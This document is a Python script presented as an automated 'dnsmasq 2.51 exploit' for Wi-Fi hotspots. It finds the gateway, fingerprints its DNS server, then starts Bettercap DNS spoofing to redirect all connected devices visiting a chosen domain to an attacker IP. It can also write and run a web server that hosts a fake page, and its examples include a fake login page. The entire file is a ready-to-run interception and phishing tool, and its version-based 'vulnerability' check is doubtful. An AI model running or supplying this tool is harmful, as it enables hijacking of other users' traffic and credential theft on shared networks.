#!/usr/bin/env python3
"""
Auto DNS Spoofing Tool for dnsmasq 2.51 hotspots
Usage: python3 hotspot_redirect.py <target_domain> <spoof_ip_or_local_page>
Example: python3 hotspot_redirect.py google.com 192.168.1.100
Example: python3 hotspot_redirect.py google.com /tmp/fake.html

This tool:
1. Detects default gateway
2. Scans gateway port 53 for dnsmasq version
3. If dnsmasq 2.51 is detected, launches Bettercap DNS spoofing automatically
4. If a local HTML file is provided, it starts a simple HTTP server to host it
"""

import sys
import os
import re
import subprocess
import json
import socket
import time
import signal
import threading

# Configuration
TARGET_DOMAIN = None
SPOOF_IP = None
SPOOF_FILE = None
INTERFACE = None
GATEWAY_IP = None


def die(msg):
    print(f"[!] {msg}")
    sys.exit(1)


def run_cmd(cmd, shell=False):
    """Run a command and return (returncode, stdout, stderr)"""
    try:
        if shell:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        else:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)


def detect_gateway_and_interface():
    """Detect default gateway IP and interface"""
    global GATEWAY_IP, INTERFACE
    print("[*] Detecting default gateway...")
    
    # Try ip route
    rc, out, err = run_cmd("ip route show default", shell=True)
    if rc == 0 and out:
        match = re.search(r'default via (\S+) dev (\S+)', out)
        if match:
            GATEWAY_IP = match.group(1)
            INTERFACE = match.group(2)
            print(f"[+] Gateway: {GATEWAY_IP} on interface {INTERFACE}")
            return True
    
    # Try route -n
    rc, out, err = run_cmd("route -n", shell=True)
    if rc == 0 and out:
        for line in out.splitlines():
            if line.startswith('0.0.0.0'):
                parts = line.split()
                if len(parts) >= 8:
                    GATEWAY_IP = parts[1]
                    INTERFACE = parts[7]
                    print(f"[+] Gateway: {GATEWAY_IP} on interface {INTERFACE}")
                    return True
    
    die("Could not detect default gateway. Are you connected to a network?")


def scan_gateway_dns():
    """Scan the gateway's DNS port to detect dnsmasq version"""
    print(f"[*] Scanning {GATEWAY_IP} for DNS service...")
    
    # Quick nmap version scan on port 53
    cmd = ["sudo", "nmap", "-sV", "-p", "53", "--script", "dns-service-discovery", GATEWAY_IP]
    rc, out, err = run_cmd(cmd)
    
    if rc != 0:
        print(f"[-] nmap scan failed: {err}")
        print("[*] Trying alternative detection with dig...")
        return scan_gateway_dns_dig()
    
    print(f"[*] nmap output:\n{out}")
    
    # Check for dnsmasq 2.51 in output
    if "dnsmasq 2.51" in out or "dnsmasq" in out:
        version_match = re.search(r'dnsmasq\s+([\d.]+)', out)
        if version_match:
            version = version_match.group(1)
            print(f"[+] Detected dnsmasq version: {version}")
            if "2.51" in version or parse_version(version) <= 2.51:
                print("[!] Target is running dnsmasq <= 2.51 - VULNERABLE to DNS spoofing!")
                return True
            else:
                print(f"[-] dnsmasq version {version} detected but not vulnerable (need <= 2.51)")
                return False
        print("[+] dnsmasq detected but version unknown, attempting exploit anyway")
        return True
    
    print("[-] dnsmasq 2.51 not detected on gateway")
    print(f"[*] Raw service detection: {out}")
    return False


def scan_gateway_dns_dig():
    """Alternative detection using dig"""
    rc, out, err = run_cmd(["dig", "@" + GATEWAY_IP, "version.bind", "CH", "TXT", "+short"])
    if rc == 0 and out:
        version = out.strip().strip('"')
        print(f"[+] DNS version detected: {version}")
        if "dnsmasq" in version.lower():
            v_match = re.search(r'([\d.]+)', version)
            if v_match:
                v = v_match.group(1)
                if "2.51" in v or parse_version(v) <= 2.51:
                    print("[!] VULNERABLE dnsmasq version detected!")
                    return True
        print(f"[-] Version {version} does not appear vulnerable")
        return False
    print("[-] dig version query failed, gateway may not respond to CHAOS queries")
    return False


def parse_version(version_string):
    """Parse version string like '2.51' into a float for comparison"""
    try:
        parts = version_string.split('.')
        return float(f"{parts[0]}.{parts[1]}")
    except:
        return 999.0  # Unknown version, assume newer


def resolve_ip_for_page(page_arg):
    """
    Determine the spoof IP address.
    If page_arg is an IP, use it.
    If page_arg is a local HTML file, start a simple HTTP server and use this machine's IP.
    """
    global SPOOF_IP, SPOOF_FILE
    
    # Check if it's an IP address
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(page_arg):
        SPOOF_IP = page_arg
        print(f"[+] Using provided IP: {SPOOF_IP}")
        return None  # No HTTP server needed
    
    # Check if it's a file
    if os.path.isfile(page_arg):
        SPOOF_FILE = page_arg
        print(f"[+] Using local file: {SPOOF_FILE}")
        # Get our local IP on the target interface
        rc, out, err = run_cmd(f"ip -4 addr show dev {INTERFACE} | grep inet | awk '{{print $2}}' | cut -d/ -f1", shell=True)
        if rc == 0 and out:
            SPOOF_IP = out.strip().split('\n')[0]
            print(f"[+] Our IP on {INTERFACE}: {SPOOF_IP}")
            return SPOOF_IP  # Return IP to start HTTP server
        die("Could not determine local IP for hosting the fake page")
    
    # Assume it's an IP or hostname to redirect to
    SPOOF_IP = page_arg
    print(f"[+] Using redirect target: {SPOOF_IP}")
    return None


def start_http_server(ip, port=8080):
    """Start a simple HTTP server to serve the spoofed page"""
    if not SPOOF_FILE:
        return None
    
    print(f"[*] Starting HTTP server on {ip}:{port} to host {SPOOF_FILE}")
    
    # Create a simple Python HTTP server that serves the file
    server_dir = os.path.dirname(os.path.abspath(SPOOF_FILE)) or "."
    file_name = os.path.basename(SPOOF_FILE)
    server_script = os.path.join(server_dir, "server.py")
    
    with open(server_script, 'w') as f:
        f.write(f'''#!/usr/bin/env python3
import http.server
import socketserver
import os

PORT = {port}
FILE_NAME = "{file_name}"
FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), FILE_NAME)

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"[*] Server running on port {PORT}")
    httpd.serve_forever()
''')
    
    # Start the server in a background thread
    server_thread = threading.Thread(
        target=lambda: run_cmd(["python3", server_script]),
        daemon=True
    )
    server_thread.start()
    time.sleep(1)
    print(f"[+] HTTP server started on {ip}:{port}")
    return server_thread


def launch_bettercap_spoof():
    """Launch Bettercap with DNS spoofing configuration"""
    print("[*] Launching Bettercap DNS spoofing attack...")
    print(f"[+] Target domain: {TARGET_DOMAIN}")
    print(f"[+] Spoof IP: {SPOOF_IP}")
    print(f"[+] Interface: {INTERFACE}")
    
    # Build Bettercap command with -eval for automation
    eval_script = f"""
set dns.spoof.all false
set dns.spoof.domains {TARGET_DOMAIN}
set dns.spoof.address {SPOOF_IP}
dns.spoof on
""".strip()
    
    # Bettercap interactive mode with eval
    cmd = ["sudo", "bettercap", "-iface", INTERFACE, "-eval", eval_script]
    
    # Run in a separate process group so we can kill it later
    print("[*] Starting Bettercap (press Ctrl+C to stop)...")
    print("[*] All connected devices trying to visit " + TARGET_DOMAIN + " will be redirected to " + SPOOF_IP)
    print("="*60)
    
    try:
        proc = subprocess.Popen(cmd)
        proc.wait()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        proc.terminate()
        proc.wait()
        print("[+] Attack stopped.")
    
    return True


def main():
    global TARGET_DOMAIN
    
    print("="*60)
    print("  Hotspot DNS Redirector - dnsmasq 2.51 Exploit")
    print("="*60)
    
    # Parse arguments
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_domain> <spoof_ip_or_page_file>")
        print(f"Example: {sys.argv[0]} google.com 192.168.1.100")
        print(f"Example: {sys.argv[0]} google.com /tmp/fake_login.html")
        sys.exit(1)
    
    TARGET_DOMAIN = sys.argv[1]
    page_arg = sys.argv[2]
    
    print(f"[*] Target domain: {TARGET_DOMAIN}")
    print(f"[*] Spoof target: {page_arg}")
    print()
    
    # Step 1: Detect gateway and interface
    if not detect_gateway_and_interface():
        die("Failed to detect gateway")
    
    print()
    
    # Step 2: Scan gateway for dnsmasq 2.51
    vulnerable = scan_gateway_dns()
    
    if not vulnerable:
        print("[-] Gateway does not appear to be running vulnerable dnsmasq 2.51")
        answer = input("[?] Attempt attack anyway? (y/N): ").strip().lower()
        if answer != 'y':
            print("[*] Exiting.")
            sys.exit(0)
        print("[*] Proceeding with attack anyway...")
    
    print()
    
    # Step 3: Resolve the spoof IP and possibly start HTTP server
    server_ip = resolve_ip_for_page(page_arg)
    server_thread = None
    if server_ip:
        server_thread = start_http_server(server_ip)
    
    print()
    
    # Step 4: Launch the attack
    try:
        launch_bettercap_spoof()
    except KeyboardInterrupt:
        pass
    
    print("[*] Attack completed.")
    sys.exit(0)


if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges. Re-running with sudo...")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    main()
